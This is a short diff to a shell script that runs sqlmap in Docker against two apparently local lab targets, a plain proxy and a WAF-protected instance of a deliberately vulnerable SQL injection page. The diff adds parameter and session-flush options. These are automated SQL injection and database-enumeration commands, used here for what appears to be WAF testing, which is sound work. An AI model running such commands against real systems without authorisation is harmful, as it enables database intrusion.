@@ -29,11 +29,11 @@ if [[ "$RUN_SQLMAP" == "--sqlmap" ]]; then
 
   docker run --rm --network srsi_net -v "${SRC_DIR}/results/sqlmap_base:/root/.local/share/sqlmap" parrotsec/sqlmap \
     -u "http://proxy-base:80/vulnerabilities/sqli/?id=1&Submit=Submit" \
-    --cookie="$BASE_COOKIE" --batch --dbs --level=2 --risk=1
+    --cookie="$BASE_COOKIE" -p id --batch --dbs --flush-session --level=2 --risk=1
 
   docker run --rm --network srsi_net -v "${SRC_DIR}/results/sqlmap_waf:/root/.local/share/sqlmap" parrotsec/sqlmap \
     -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
-    --cookie="$WAF_COOKIE" --batch --dbs --level=2 --risk=1
+    --cookie="$WAF_COOKIE" -p id --batch --dbs --flush-session --level=2 --risk=1
 fi
 
 echo "[+] Concluido! Verifica a pasta SRC/results e SRC/logs/audit.log."
